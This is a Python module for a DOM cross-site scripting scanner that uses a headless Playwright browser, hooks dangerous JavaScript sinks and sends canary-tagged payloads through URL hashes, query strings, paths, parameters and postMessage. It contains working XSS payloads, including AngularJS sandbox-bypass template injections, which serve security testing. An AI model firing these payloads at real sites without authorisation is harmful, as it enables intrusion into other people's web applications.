"""
DOM XSS Detector using Playwright headless browser.

Monitors JavaScript execution for dangerous sink usage and
detects when user-controlled input reaches executable contexts.
"""

import asyncio
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from playwright.async_api import async_playwright, Page, Browser, ConsoleMessage
from bugtrace.utils.logger import get_logger

logger = get_logger("tools.dom_xss")


@dataclass
class DOMXSSFinding:
    """Represents a confirmed DOM XSS vulnerability."""
    url: str
    payload: str
    sink: str  # innerHTML, eval, document.write, etc.
    source: str  # location.hash, location.search, document.referrer, etc.
    evidence: str
    severity: str = "HIGH"


class DOMXSSDetector:
    """
    Headless browser-based DOM XSS detector.

    Uses Playwright to:
    1. Inject monitoring scripts that hook dangerous sinks
    2. Load pages with XSS payloads in various sources
    3. Detect when payloads reach dangerous sinks
    4. Confirm execution via alert/error interception
    """

    def __init__(self, timeout: int = 10000):
        self.timeout = timeout
        self.browser: Optional[Browser] = None
        self.playwright = None
        self.findings: List[DOMXSSFinding] = []

    async def __aenter__(self):
        await self.start()
        return self

    async def __aexit__(self, *args):
        await self.stop()

    async def start(self):
        """Start the headless browser."""
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-web-security",  # Allow cross-origin for testing
                "--disable-features=IsolateOrigins,site-per-process",
            ]
        )
        logger.info("[DOMXSSDetector] Headless browser started")

    async def stop(self):
        """Stop the headless browser."""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
        logger.info("[DOMXSSDetector] Headless browser stopped")

    def _get_monitor_script(self) -> str:
        """
        TASK-55: Enhanced taint tracking for DOM XSS detection.
        Monitors dangerous sinks AND tracks tainted sources.

        IMPROVED (2026-01-30): Added AngularJS-specific monitoring.
        """
        parts = [
            self._build_monitor_header(),
            self._build_source_tracking(),
            self._build_sink_monitoring(),
            self._build_jquery_hooks(),
            self._build_angular_hooks(),
            "console.log('DOMXSS_MONITOR_INJECTED_V3');"
        ]
        return f"(function() {{ {' '.join(parts)} }})();"

    def _build_monitor_header(self) -> str:
        """Initialize monitoring arrays and canary constant."""
        return """
            window.__domxss_findings = [];
            window.__domxss_sources = [];
            const CANARY = 'DOMXSS_CANARY_7x7';
        """

    def _build_source_tracking(self) -> str:
        """Build source tracking hooks for location.hash, .search, and document.referrer."""
        return """
            const originalHashDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'hash');
            if (originalHashDesc && originalHashDesc.get) {
                Object.defineProperty(Location.prototype, 'hash', {
                    get: function() {
                        const value = originalHashDesc.get.call(this);
                        if (value && value.includes(CANARY)) {
                            window.__domxss_sources.push({source: 'location.hash', value: value});
                        }
                        return value;
                    },
                    set: originalHashDesc.set
                });
            }
            const originalSearchDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'search');
            if (originalSearchDesc && originalSearchDesc.get) {
                Object.defineProperty(Location.prototype, 'search', {
                    get: function() {
                        const value = originalSearchDesc.get.call(this);
                        if (value && value.includes(CANARY)) {
                            window.__domxss_sources.push({source: 'location.search', value: value});
                        }
                        return value;
                    },
                    set: originalSearchDesc.set
                });
            }
            const originalReferrer = Object.getOwnPropertyDescriptor(Document.prototype, 'referrer');
            if (originalReferrer && originalReferrer.get) {
                Object.defineProperty(Document.prototype, 'referrer', {
                    get: function() {
                        const value = originalReferrer.get.call(this);
                        if (value && value.includes(CANARY)) {
                            window.__domxss_sources.push({source: 'document.referrer', value: value});
                        }
                        return value;
                    }
                });
            }
        """

    def _build_sink_monitoring(self) -> str:
        """Build sink monitoring hooks for innerHTML, eval, document.write, etc."""
        return """
            const originalInnerHTMLDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
            if (originalInnerHTMLDesc) {
                Object.defineProperty(Element.prototype, 'innerHTML', {
                    set: function(value) {
                        if (value && value.toString().includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'innerHTML',
                                value: value.toString().substring(0, 500),
                                element: this.tagName,
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:innerHTML:' + value.toString().substring(0, 200));
                        }
                        return originalInnerHTMLDesc.set.call(this, value);
                    },
                    get: originalInnerHTMLDesc.get
                });
            }
            const originalOuterHTMLDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML');
            if (originalOuterHTMLDesc && originalOuterHTMLDesc.set) {
                Object.defineProperty(Element.prototype, 'outerHTML', {
                    set: function(value) {
                        if (value && value.toString().includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'outerHTML',
                                value: value.toString().substring(0, 500),
                                element: this.tagName,
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:outerHTML:' + value.toString().substring(0, 200));
                        }
                        return originalOuterHTMLDesc.set.call(this, value);
                    },
                    get: originalOuterHTMLDesc.get
                });
            }
            const originalWrite = document.write;
            document.write = function(content) {
                if (content && content.toString().includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'document.write',
                        value: content.toString().substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:document.write:' + content.toString().substring(0, 200));
                }
                return originalWrite.apply(this, arguments);
            };
            const originalWriteln = document.writeln;
            document.writeln = function(content) {
                if (content && content.toString().includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'document.writeln',
                        value: content.toString().substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:document.writeln:' + content.toString().substring(0, 200));
                }
                return originalWriteln.apply(this, arguments);
            };
            const originalEval = window.eval;
            window.eval = function(code) {
                if (code && code.toString().includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'eval',
                        value: code.toString().substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:eval:' + code.toString().substring(0, 200));
                }
                return originalEval.apply(this, arguments);
            };
            const OriginalFunction = window.Function;
            window.Function = function(...args) {
                const code = args.join(',');
                if (code.includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'Function',
                        value: code.substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:Function:' + code.substring(0, 200));
                }
                return new OriginalFunction(...args);
            };
            const originalSetTimeout = window.setTimeout;
            window.setTimeout = function(handler, timeout, ...args) {
                if (typeof handler === 'string' && handler.includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'setTimeout',
                        value: handler.substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:setTimeout:' + handler.substring(0, 200));
                }
                return originalSetTimeout.apply(this, arguments);
            };
            const originalSetInterval = window.setInterval;
            window.setInterval = function(handler, timeout, ...args) {
                if (typeof handler === 'string' && handler.includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'setInterval',
                        value: handler.substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:setInterval:' + handler.substring(0, 200));
                }
                return originalSetInterval.apply(this, arguments);
            };
        """

    def _build_jquery_hooks(self) -> str:
        """Build jQuery-specific hooks if jQuery is present."""
        return """
            if (window.jQuery) {
                const CANARY = 'DOMXSS_CANARY_7x7';
                const originalHtml = jQuery.fn.html;
                jQuery.fn.html = function(value) {
                    if (value && value.toString().includes(CANARY)) {
                        window.__domxss_findings.push({
                            sink: 'jQuery.html',
                            value: value.toString().substring(0, 500),
                            sources: [...window.__domxss_sources]
                        });
                        console.error('DOMXSS_DETECTED:jQuery.html:' + value.toString().substring(0, 200));
                    }
                    return originalHtml.apply(this, arguments);
                };
                const originalAppend = jQuery.fn.append;
                jQuery.fn.append = function(value) {
                    if (value && value.toString().includes(CANARY)) {
                        window.__domxss_findings.push({
                            sink: 'jQuery.append',
                            value: value.toString().substring(0, 500),
                            sources: [...window.__domxss_sources]
                        });
                        console.error('DOMXSS_DETECTED:jQuery.append:' + value.toString().substring(0, 200));
                    }
                    return originalAppend.apply(this, arguments);
                };
            }
        """

    def _build_angular_hooks(self) -> str:
        """ADDED (2026-01-30): Build AngularJS-specific hooks for template execution detection."""
        return """
            if (window.angular) {
                const CANARY = 'DOMXSS_CANARY_7x7';
                // Monitor Angular template compilation
                const originalCompile = angular.element.prototype.html;
                if (originalCompile) {
                    angular.element.prototype.html = function(value) {
                        if (value && value.toString().includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'angular.element.html',
                                value: value.toString().substring(0, 500),
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:angular.element.html:' + value.toString().substring(0, 200));
                        }
                        return originalCompile.apply(this, arguments);
                    };
                }
                // Monitor $compile service if available
                try {
                    const injector = angular.element(document).injector();
                    if (injector) {
                        const originalCompileService = injector.get('$compile');
                        if (originalCompileService) {
                            injector.get('$rootScope').$watch(function() {
                                const template = document.body.innerHTML;
                                if (template.includes(CANARY) && template.includes('{{')) {
                                    window.__domxss_findings.push({
                                        sink: '$compile',
                                        value: 'AngularJS template evaluation with user input',
                                        sources: [...window.__domxss_sources]
                                    });
                                    console.error('DOMXSS_DETECTED:$compile:AngularJS');
                                }
                            });
                        }
                    }
                } catch (e) {
                    // Injector not ready yet
                }
            }
        """

    def _get_dom_xss_payloads(self) -> List[Dict[str, str]]:
        """
        Returns payloads designed for DOM XSS detection.
        Each payload contains a canary that our hooks will detect.

        IMPROVED (2026-01-30): Added AngularJS-specific payloads for ginandjuice.shop.
        """
        canary = "DOMXSS_CANARY_7x7"

        return [
            {"payload": canary, "type": "canary"},
            {"payload": f"<img src=x onerror=alert('{canary}')>", "type": "img_onerror"},
            {"payload": f"<svg onload=alert('{canary}')>", "type": "svg_onload"},
            {"payload": f"<body onload=alert('{canary}')>", "type": "body_onload"},
            {"payload": f"<iframe srcdoc='<script>alert(\"{canary}\")</script>'>", "type": "iframe_srcdoc"},
            {"payload": f"javascript:alert('{canary}')", "type": "javascript_uri"},
            {"payload": f"'-alert('{canary}')-'", "type": "js_breakout_single"},
            {"payload": f'"-alert("{canary}")-"', "type": "js_breakout_double"},
            {"payload": f"</script><script>alert('{canary}')</script>", "type": "script_breakout"},
            # ADDED (2026-01-30): AngularJS-specific payloads
            {"payload": f"{{{{constructor.constructor('alert(\"{canary}\")')()}}}}", "type": "angular_constructor"},
            {"payload": f"{{{{$on.constructor('alert(\"{canary}\")')()}}}}", "type": "angular_on"},
            {"payload": f"{{{{['a]'constructor.prototype.charAt=[].join;$eval('x={canary}');'x'}}}}", "type": "angular_sandbox_bypass"},
        ]

    async def scan(self, url: str) -> List[DOMXSSFinding]:
        """Scan a URL for DOM XSS vulnerabilities.

        IMPROVED (2026-01-30): Added more sources and comprehensive testing.
        """
        if not self.browser:
            await self.start()

        findings = []
        payloads = self._get_dom_xss_payloads()
        # IMPROVED: Test more injection points
        sources = ["hash", "search", "path"]

        context, page = await self._setup_scan_context()

        try:
            # Test standard sources
            for source in sources:
                finding = await self._test_source(url, source, payloads, page)
                if finding:
                    findings.append(finding)

            # IMPROVED: Also test URL parameters directly if URL has params
            param_findings = await self._test_url_parameters(url, payloads, page)
            findings.extend(param_findings)

            # IMPROVED: Test postMessage-based XSS
            postmsg_finding = await self._test_postmessage_xss(url, page)
            if postmsg_finding:
                findings.append(postmsg_finding)

        except Exception as e:
            logger.error(f"[DOMXSSDetector] Scan error: {e}", exc_info=True)
        finally:
            await self._cleanup_scan_context(page, context)

        self.findings.extend(findings)
        return findings

    async def _test_url_parameters(self, url: str, payloads: List[Dict], page) -> List[DOMXSSFinding]:
        """ADDED (2026-01-30): Test each URL parameter for DOM XSS."""
        findings = []
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        for param_name in params:
            for p in payloads[:5]:  # Test first 5 payloads per param
                payload = p["payload"]
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload

                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params), parsed.fragment
                ))

                finding = await self._test_payload(test_url, payload, f"param:{param_name}", page)
                if finding:
                    findings.append(finding)
                    break  # Found XSS in this param, move to next

        return findings

    async def _test_postmessage_xss(self, url: str, page) -> Optional[DOMXSSFinding]:
        """ADDED (2026-01-30): Test for postMessage-based DOM XSS."""
        try:
            await page.goto(url, wait_until="networkidle", timeout=self.timeout)

            # Inject postMessage with XSS payload
            canary = "DOMXSS_CANARY_7x7"
            payload = f"<img src=x onerror=alert('{canary}')>"

            result = await page.evaluate(f"""
                () => {{
                    return new Promise((resolve) => {{
                        const payload = `{payload}`;
                        window.postMessage(payload, '*');
                        setTimeout(() => {{
                            const findings = window.__domxss_findings || [];
                            resolve(findings.length > 0 ? findings[0] : null);
                        }}, 500);
                    }});
                }}
            """)

            if result:
                return DOMXSSFinding(
                    url=url, payload=payload, sink=result.get("sink", "postMessage"),
                    source="window.postMessage", evidence=result.get("value", "postMessage XSS")
                )
        except Exception as e:
            logger.debug(f"postMessage XSS test failed: {e}")

        return None

    async def _setup_scan_context(self):
        """Setup browser context and page for scanning."""
        context = await self.browser.new_context()
        page = await context.new_page()
        await page.add_init_script(self._get_monitor_script())
        return context, page

    async def _test_source(self, url: str, source: str, payloads: List[Dict], page) -> Optional[DOMXSSFinding]:
        """Test a specific source (hash or search) with all payloads."""
        for p in payloads:
            payload = p["payload"]
            test_url = self._build_test_url(url, source, payload)

            finding = await self._test_payload(test_url, payload, source, page)
            if finding:
                return finding
        return None

    def _build_test_url(self, url: str, source: str, payload: str) -> str:
        """Build test URL with payload in specified source.

        IMPROVED (2026-01-30): Support path-based injection.
        """
        from urllib.parse import quote

        if source == "hash":
            return f"{url}#{payload}"
        elif source == "path":
            # IMPROVED: Inject payload in path (some apps reflect path segments)
            safe_payload = quote(payload, safe='')
            if url.endswith('/'):
                return f"{url}{safe_payload}"
            return f"{url}/{safe_payload}"
        else:  # search
            sep = "&" if "?" in url else "?"
            return f"{url}{sep}xss={payload}"

    async def _test_payload(self, test_url: str, payload: str, source: str, page) -> Optional[DOMXSSFinding]:
        """Test a single payload and check for XSS execution."""
        dialog_messages = []

        def dialog_handler(d):
            dialog_messages.append(d.message)
            asyncio.create_task(d.dismiss())

        page.on("dialog", dialog_handler)

        try:
            await page.goto(test_url, wait_until="networkidle", timeout=self.timeout)
            await asyncio.sleep(0.5)
            js_findings = await page.evaluate("window.__domxss_findings || []")

            if dialog_messages or js_findings:
                evidence = dialog_messages[0] if dialog_messages else js_findings[0]["value"]
                sink = "alert" if dialog_messages else js_findings[0]["sink"]
                return DOMXSSFinding(
                    url=test_url, payload=payload, sink=sink,
                    source=f"location.{source}", evidence=evidence
                )
        except Exception as e:
            logger.debug(f"Error testing {test_url}: {e}")
        finally:
            try:
                page.remove_listener("dialog", dialog_handler)
            except Exception as e:
                logger.debug(f"Failed to remove dialog listener: {e}")
        return None

    async def _cleanup_scan_context(self, page, context):
        """Clean up page and context resources."""
        if page:
            try:
                await page.close()
            except Exception as e:
                logger.debug(f"Error closing page: {e}")
        if context:
            try:
                await context.close()
            except Exception as e:
                logger.debug(f"Error closing context: {e}")


async def detect_dom_xss(url: str, timeout: int = 10000) -> List[Dict[str, Any]]:
    """Convenience function for XSSAgent integration."""
    async with DOMXSSDetector(timeout=timeout) as detector:
        findings = await detector.scan(url)

    return [
        {
            "vulnerability_type": "DOM_XSS",
            "url": f.url,
            "payload": f.payload,
            "sink": f.sink,
            "source": f.source,
            "evidence": f.evidence,
            "severity": f.severity,
            "status": "VALIDATED_CONFIRMED",
            "validated": True
        }
        for f in findings
    ]
